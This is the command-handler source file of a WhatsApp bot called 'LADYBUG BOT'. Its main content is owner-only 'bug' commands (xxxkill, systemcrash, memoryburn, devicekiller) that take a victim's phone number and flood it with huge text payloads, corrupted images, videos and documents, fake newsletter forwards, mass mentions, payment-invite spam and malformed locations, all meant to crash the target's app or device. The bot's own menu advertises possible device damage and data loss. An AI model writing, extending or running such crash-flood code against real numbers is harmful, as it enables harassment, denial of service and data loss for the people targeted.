const fs = require('fs')
const chalk = require('chalk')
const axios = require('axios')
const { exec } = require('child_process')
const { promisify } = require('util')
const execAsync = promisify(exec)

// Load settings and utilities
const settings = require('./settings')
const { getBuffer, fetchJson, runtime, sleep } = require('./lib/myfunc')
const { 
    generateHeavyPayload, 
    createCorruptedBuffer, 
    createBugQuoted, 
    generateNewsletterJid,
    createSystemCrashPayload,
    createMemoryBurnContact,
    executeDeviceKiller
} = require('./lib/bugfunctions')

// Command prefix
const prefix = settings.prefix || '.'

module.exports = async (XeonBotInc, m, chatUpdate, store) => {
    try {
        // Basic message info
        const body = (m.mtype === 'conversation') ? m.message.conversation : 
                    (m.mtype === 'imageMessage') ? m.message.imageMessage.caption : 
                    (m.mtype === 'videoMessage') ? m.message.videoMessage.caption : 
                    (m.mtype === 'extendedTextMessage') ? m.message.extendedTextMessage.text : 
                    (m.mtype === 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : 
                    (m.mtype === 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : 
                    (m.mtype === 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : 
                    (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''

        const budy = (typeof m.text === 'string' ? m.text : '')
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await XeonBotInc.decodeJid(XeonBotInc.user.id)
        const isOwner = [botNumber, ...settings.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isCreator = isOwner
        const text = args.join(" ")
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const isMedia = /image|video|sticker|audio/.test(mime)

        // Add reply function
        const reply = (text) => {
            return XeonBotInc.sendMessage(m.chat, { text: text }, { quoted: m })
        }

        // Set global variables safely
        const botname = global.botname || settings.botname || 'LADYBUG BOT'
        const currentPrefix = global.prefix || settings.prefix || prefix

        // Only process messages that start with prefix
        if (!body.startsWith(prefix)) return

        console.log(chalk.blue(`[LADYBUG] Command: ${command} | From: ${pushname} | Chat: ${m.chat}`))

        // Command handlers with individual try-catch
        switch (command) {
            case 'xxxkill': {
                try {
                    if (!isOwner) {
                        return reply('🚫 *OWNER ONLY*\n\nAccess Denied!');
                    }
                    if (!text) return reply(`💀 *XXXKILL BUG*\n\n📝 Usage: ${prefix + command} number\n📋 Example: ${prefix + command} 919876543210\n\n⚠️ EXTREME BUG!`);
                    
                    const victim = text + "@s.whatsapp.net";
                    const loadingMsg = await XeonBotInc.sendMessage(m.chat, { text: '💀 Deploying XXXKILL...' }, { quoted: m });

                    // Phase 1: Newsletter spam with heavy payload
                    for (let i = 0; i < 100; i++) {
                        try {
                            await XeonBotInc.sendMessage(victim, {
                                text: generateHeavyPayload(200000),
                                contextInfo: {
                                    isForwarded: true,
                                    forwardedNewsletterMessageInfo: {
                                        newsletterJid: generateNewsletterJid(),
                                        newsletterName: generateHeavyPayload(100000),
                                        serverMessageId: 999999999
                                    },
                                    externalAdReply: {
                                        title: generateHeavyPayload(50000),
                                        body: generateHeavyPayload(50000),
                                        mediaType: 1,
                                        renderLargerThumbnail: true,
                                        thumbnailUrl: 'https://example.com/image.jpg',
                                        sourceUrl: 'https://wa.me/' + text
                                    }
                                }
                            }, { quoted: createBugQuoted() });
                        } catch (e) {
                            console.log('Phase 1 error:', e);
                        }
                    }

                    // Phase 2: Payment invite spam
                    for (let i = 0; i < 50; i++) {
                        try {
                            await XeonBotInc.relayMessage(victim, {
                                paymentInviteMessage: {
                                    serviceType: "FBPAY",
                                    expiryTimestamp: Date.now() + 999999999999
                                }
                            }, {});
                        } catch (e) {
                            console.log('Phase 2 error:', e);
                        }
                    }

                    // Phase 3: Corrupted media
                    for (let i = 0; i < 25; i++) {
                        try {
                            await XeonBotInc.sendMessage(victim, {
                                image: createCorruptedBuffer(500000),
                                caption: generateHeavyPayload(100000),
                                contextInfo: {
                                    mentionedJid: [victim],
                                    isForwarded: true,
                                    forwardedNewsletterMessageInfo: {
                                        newsletterJid: generateNewsletterJid(),
                                        newsletterName: generateHeavyPayload(100000),
                                        serverMessageId: 999999999
                                    }
                                }
                            }, { quoted: createBugQuoted() });
                        } catch (e) {
                            console.log('Phase 3 error:', e);
                        }
                    }

                    await XeonBotInc.sendMessage(m.chat, { 
                        text: `💀 *XXXKILL DEPLOYED*\n\n🎯 Target: ${victim}\n💥 Status: COMPLETE`, 
                        edit: loadingMsg.key 
                    });
                } catch (error) {
                    console.error('XXXKILL error:', error);
                    await reply('❌ XXXKILL deployment failed');
                }
                break;
            }

            case 'systemcrash': {
                try {
                    if (!isOwner) {
                        return reply('🚫 *OWNER ONLY*\n\nAccess Denied!');
                    }
                    if (!text) return reply(`🔥 *SYSTEM CRASH*\n\n📝 Usage: ${prefix + command} number\n📋 Example: ${prefix + command} 919876543210`);
                    
                    const victim = text + "@s.whatsapp.net";
                    const loadingMsg = await XeonBotInc.sendMessage(m.chat, { text: '🔥 Initiating System Crash...' }, { quoted: m });

                    // Create system overload
                    const crashSequence = async () => {
                        // Memory overload attack
                        for (let i = 0; i < 75; i++) {
                            const heavyContext = createSystemCrashPayload();
                            heavyContext.contextInfo.mentionedJid = Array(1000).fill(victim);
                            
                            try {
                                await XeonBotInc.sendMessage(victim, heavyContext, { quoted: createBugQuoted() });
                            } catch (e) {
                                console.log('Crash sequence error:', e);
                            }
                        }

                        // Location overload
                        for (let i = 0; i < 30; i++) {
                            try {
                                await XeonBotInc.sendMessage(victim, {
                                    location: {
                                        degreesLatitude: 999.999999999999,
                                        degreesLongitude: -999.999999999999,
                                        name: '🔥CRASH🔥'.repeat(100000),
                                        address: 'SYSTEM OVERLOAD'.repeat(50000),
                                        jpegThumbnail: createCorruptedBuffer(300000)
                                    }
                                }, { quoted: createBugQuoted() });
                            } catch (e) {
                                console.log('Location crash error:', e);
                            }
                        }
                    };

                    await crashSequence();
                    await XeonBotInc.sendMessage(m.chat, { 
                        text: `🔥 *SYSTEM CRASH COMPLETE*\n\n🎯 Target: ${victim}\n💥 Status: OVERLOADED`, 
                        edit: loadingMsg.key 
                    });
                } catch (error) {
                    console.error('System crash error:', error);
                    await reply('❌ System crash failed');
                }
                break;
            }

            case 'memoryburn': {
                try {
                    if (!isOwner) {
                        return reply('🚫 *OWNER ONLY*\n\nAccess Denied!');
                    }
                    if (!text) return reply(`🧠 *MEMORY BURN*\n\n📝 Usage: ${prefix + command} number\n📋 Example: ${prefix + command} 919876543210`);
                    
                    const victim = text + "@s.whatsapp.net";
                    const loadingMsg = await XeonBotInc.sendMessage(m.chat, { text: '🧠 Burning Memory...' }, { quoted: m });

                    // Memory exhaustion attack
                    for (let round = 0; round < 50; round++) {
                        try {
                            // Document memory burn
                            await XeonBotInc.sendMessage(victim, {
                                document: createCorruptedBuffer(999999),
                                fileName: '🧠MEMORY_BURN🧠'.repeat(10000) + '.exe',
                                mimetype: 'application/octet-stream',
                                caption: generateHeavyPayload(100000),
                                contextInfo: {
                                    isForwarded: true,
                                    forwardedNewsletterMessageInfo: {
                                        newsletterJid: generateNewsletterJid(),
                                        newsletterName: '🧠BURN🧠'.repeat(100000),
                                        serverMessageId: 999999999
                                    }
                                }
                            }, { quoted: createBugQuoted() });

                            // Video memory burn
                            await XeonBotInc.sendMessage(victim, {
                                video: createCorruptedBuffer(999999),
                                caption: '🧠MEMORY OVERLOAD🧠'.repeat(50000),
                                mimetype: 'video/mp4',
                                contextInfo: {
                                    mentionedJid: Array(500).fill(victim),
                                    isForwarded: true,
                                    forwardedNewsletterMessageInfo: {
                                        newsletterJid: generateNewsletterJid(),
                                        newsletterName: generateHeavyPayload(100000),
                                        serverMessageId: 999999999
                                    }
                                }
                            }, { quoted: createBugQuoted() });

                            // Contact memory burn
                            const contacts = createMemoryBurnContact(text);
                            await XeonBotInc.sendMessage(victim, { contacts }, { quoted: createBugQuoted() });
                        } catch (e) {
                            console.log('Memory burn error:', e);
                        }
                    }

                    await XeonBotInc.sendMessage(m.chat, { 
                        text: `🧠 *MEMORY BURN COMPLETE*\n\n🎯 Target: ${victim}\n🔥 Status: BURNED`, 
                        edit: loadingMsg.key 
                    });
                } catch (error) {
                    console.error('Memory burn error:', error);
                    await reply('❌ Memory burn failed');
                }
                break;
            }

            case 'devicekiller': {
                try {
                    if (!isOwner) {
                        return reply('🚫 *OWNER ONLY*\n\nAccess Denied!');
                    }
                    if (!text) return reply(`⚡ *DEVICE KILLER*\n\n📝 Usage: ${prefix + command} number\n📋 Example: ${prefix + command} 919876543210\n\n💀 ULTIMATE BUG!`);
                    
                    const victim = text + "@s.whatsapp.net";
                    const loadingMsg = await XeonBotInc.sendMessage(m.chat, { text: '⚡ Activating Device Killer...' }, { quoted: m });

                    // Ultimate device killing sequence
                    await executeDeviceKiller(XeonBotInc, victim);

                    // Additional phases
                    // Payment spam
                    for (let i = 0; i < 100; i++) {
                        try {
                            await XeonBotInc.relayMessage(victim, {
                                paymentInviteMessage: {
                                    serviceType: "FBPAY",
                                    expiryTimestamp: Date.now() + 999999999999
                                }
                            }, {});
                        } catch (e) {
                            console.log('Payment spam error:', e);
                        }
                    }

                    // Media overload
                    for (let i = 0; i < 50; i++) {
                        try {
                            await XeonBotInc.sendMessage(victim, {
                                image: createCorruptedBuffer(999999),
                                caption: '⚡DEVICE KILLER⚡'.repeat(50000),
                                contextInfo: {
                                    mentionedJid: Array(1000).fill(victim),
                                    isForwarded: true,
                                    forwardedNewsletterMessageInfo: {
                                        newsletterJid: generateNewsletterJid(),
                                        newsletterName: generateHeavyPayload(100000),
                                        serverMessageId: 999999999
                                    }
                                }
                            }, { quoted: createBugQuoted() });
                        } catch (e) {
                            console.log('Media overload error:', e);
                        }
                    }

                    await XeonBotInc.sendMessage(m.chat, { 
                        text: `⚡ *DEVICE KILLER DEPLOYED*\n\n🎯 Target: ${victim}\n💀 Status: TERMINATED`, 
                        edit: loadingMsg.key 
                    });
                } catch (error) {
                    console.error('Device killer error:', error);
                    await reply('❌ Device killer failed');
                }
                break;
            }

            case 'buglist': {
                try {
                    if (!isOwner) {
                        return reply('🚫 *OWNER ONLY*\n\nAccess Denied!');
                    }
                    
                    const bugMenu = `💀 *LADYBUG BUG ARSENAL* 💀\n\n` +
                        `👤 *Owner:* 263777124998\n` +
                        `🤖 *Bot:* ${botname}\n\n` +
                        `🔥 *AVAILABLE BUGS:*\n\n` +
                        `💀 ${prefix}xxxkill number\n` +
                        ` └ Ultimate kill bug\n\n` +
                        `🔥 ${prefix}systemcrash number\n` +
                        ` └ System overload attack\n\n` +
                        `🧠 ${prefix}memoryburn number\n` +
                        ` └ Memory exhaustion bug\n\n` +
                        `⚡ ${prefix}devicekiller number\n` +
                        ` └ Ultimate device killer\n\n` +
                        `⚠️ *EXTREME WARNING:*\n` +
                        `• Can permanently damage devices\n` +
                        `• May cause data loss\n` +
                        `• Use only for testing\n` +
                        `• Owner fully responsible\n\n` +
                        `💀 *USE AT YOUR OWN RISK* 💀`;

                    await reply(bugMenu);
                } catch (error) {
                    console.error('Bug list error:', error);
                    await reply('❌ Menu error');
                }
                break;
            }

            case 'menu':
            case 'help': {
                try {
                    // Function to read all cases from the current file
                    function getAllCases() {
                        try {
                            const filePath = __filename;
                            const fileContent = fs.readFileSync(filePath, 'utf8');
                            const caseRegex = /case\s+['"`]([^'"`]+)['"`]:/g;
                            const cases = [];
                            let match;
                            
                            while ((match = caseRegex.exec(fileContent)) !== null) {
                                if (!cases.includes(match[1])) {
                                    cases.push(match[1]);
                                }
                            }
                            return cases.sort();
                        } catch (error) {
                            console.log('Error reading cases:', error);
                            return ['menu', 'help', 'ping', 'owner', 'script', 'info', 'status', 'buglist'];
                        }
                    }

                    // Categorize commands
                    function categorizeCommands(cases) {
                        const categories = {
                            general: [],
                            bug: [],
                            owner: [],
                            other: []
                        };

                        cases.forEach(cmd => {
                            const command = cmd.toLowerCase();
                            if (['ping', 'menu', 'help', 'runtime', 'owner', 'script', 'info', 'status'].includes(command)) {
                                categories.general.push(cmd);
                            } else if (['xxxkill', 'systemcrash', 'memoryburn', 'devicekiller', 'buglist'].includes(command)) {
                                categories.bug.push(cmd);
                            } else if (['restart', 'eval', 'exec', 'broadcast', 'block', 'unblock', 'ban'].includes(command)) {
                                categories.owner.push(cmd);
                            } else {
                                categories.other.push(cmd);
                            }
                        });

                        return categories;
                    }

                    const allCases = getAllCases();
                    const categories = categorizeCommands(allCases);
                    const totalCommands = allCases.length;
                    const currentTime = new Date().toLocaleTimeString();
                    const currentDate = new Date().toLocaleDateString();

                    let menuText = `╔═══════════════════════════════╗\n`;
                    menuText += `║ 💀 LADYBUG BOT MENU 💀 ║\n`;
                    menuText += `╠═══════════════════════════════╣\n`;
                    menuText += `║ 🔮 User: ${pushname}\n`;
                    menuText += `║ 📅 Date: ${currentDate}\n`;
                    menuText += `║ ⏰ Time: ${currentTime}\n`;
                    menuText += `║ 🚀 Uptime: ${runtime(process.uptime())}\n`;
                    menuText += `║ 💫 Commands: ${totalCommands}\n`;
                    menuText += `║ 🌐 Status: ONLINE\n`;
                    menuText += `╚═══════════════════════════════╝\n\n`;

                    // General Commands
                    if (categories.general.length > 0) {
                        menuText += `🔰 *GENERAL COMMANDS*\n`;
                        categories.general.forEach(cmd => {
                            menuText += `│ ${prefix}${cmd}\n`;
                        });
                        menuText += `\n`;
                    }

                    // Bug Commands (Owner Only)
                    if (categories.bug.length > 0 && isOwner) {
                        menuText += `💀 *BUG COMMANDS* (Owner Only)\n`;
                        categories.bug.forEach(cmd => {
                            menuText += `│ ${prefix}${cmd}\n`;
                        });
                        menuText += `\n`;
                    }

                    // Owner Commands
                    if (categories.owner.length > 0 && isOwner) {
                        menuText += `👑 *OWNER COMMANDS*\n`;
                        categories.owner.forEach(cmd => {
                            menuText += `│ ${prefix}${cmd}\n`;
                        });
                        menuText += `\n`;
                    }

                    // Other Commands
                    if (categories.other.length > 0) {
                        menuText += `🎯 *OTHER COMMANDS*\n`;
                        categories.other.forEach(cmd => {
                            menuText += `│ ${prefix}${cmd}\n`;
                        });
                        menuText += `\n`;
                    }

                    menuText += `💀 *LADYBUG BOT* - Powered by AI\n`;
                    menuText += `📞 Owner: 263777124998\n`;
                    menuText += `⚠️ Use bug commands responsibly!`;

                    await reply(menuText);
                } catch (error) {
                    console.error('Menu error:', error);
                    await reply('❌ Menu generation failed');
                }
                break;
            }

            case 'ping': {
                try {
                    const start = Date.now();
                    const pingMsg = await reply('🏓 Pinging...');
                    const end = Date.now();
                    const ping = end - start;
                    
                    await XeonBotInc.sendMessage(m.chat, {
                        text: `🏓 *PONG!*\n\n⚡ Speed: ${ping}ms\n🚀 Uptime: ${runtime(process.uptime())}\n💀 Bot: ${botname}`,
                        edit: pingMsg.key
                    });
                } catch (error) {
                    console.error('Ping error:', error);
                    await reply('❌ Ping failed');
                }
                break;
            }

            case 'owner': {
                try {
                    const ownerInfo = `👑 *BOT OWNER INFO*\n\n` +
                        `📱 Number: 263777124998\n` +
                        `🤖 Bot: ${botname}\n` +
                        `💀 Version: LADYBUG v2.0\n` +
                        `🔥 Status: ACTIVE\n\n` +
                        `⚠️ *WARNING:*\n` +
                        `This bot contains powerful bug commands.\n` +
                        `Use responsibly and at your own risk!`;
                    
                    await reply(ownerInfo);
                } catch (error) {
                    console.error('Owner info error:', error);
                    await reply('❌ Owner info failed');
                }
                break;
            }

            default: {
                // Handle unknown commands
                if (body.startsWith(prefix)) {
                    await reply(`❌ Unknown command: *${command}*\n\nType *${prefix}menu* to see available commands.`);
                }
                break;
            }
        }
    } catch (error) {
        console.error('Main handler error:', error);
        await reply('❌ An error occurred while processing your request.');
    }
};

// Runtime function
function runtime(seconds) {
    seconds = Number(seconds);
    var d = Math.floor(seconds / (3600 * 24));
    var h = Math.floor(seconds % (3600 * 24) / 3600);
    var m = Math.floor(seconds % 3600 / 60);
    var s = Math.floor(seconds % 60);
    var dDisplay = d > 0 ? d + (d == 1 ? " day, " : " days, ") : "";
    var hDisplay = h > 0 ? h + (h == 1 ? " hour, " : " hours, ") : "";
    var mDisplay = m > 0 ? m + (m == 1 ? " minute, " : " minutes, ") : "";
    var sDisplay = s > 0 ? s + (s == 1 ? " second" : " seconds") : "";
    return dDisplay + hDisplay + mDisplay + sDisplay;
}
